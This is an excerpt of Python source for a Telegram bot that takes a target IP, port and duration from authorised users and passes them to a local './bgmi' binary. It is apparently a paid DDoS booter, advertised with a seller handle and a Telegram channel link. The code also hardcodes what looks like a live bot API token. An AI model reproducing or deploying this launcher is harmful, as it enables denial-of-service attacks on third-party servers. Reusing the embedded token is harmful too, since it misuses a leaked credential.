...
bot = telebot.TeleBot('7339174344:AAHfRmjRqI0wnfrKXgUC3AsP0smDACPSVvc')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 901:
                ...
                full_command = f"./bgmi {target} {port} {time} 303"
...
Buy From :- @xx_villian_xx
Official Channel :- https://t.me/+HEH5D3vACdthNTM1
'''
...
✅Join :- https://t.me/+HEH5D3vACdthNTM1'''
    bot.reply_to(message, response)
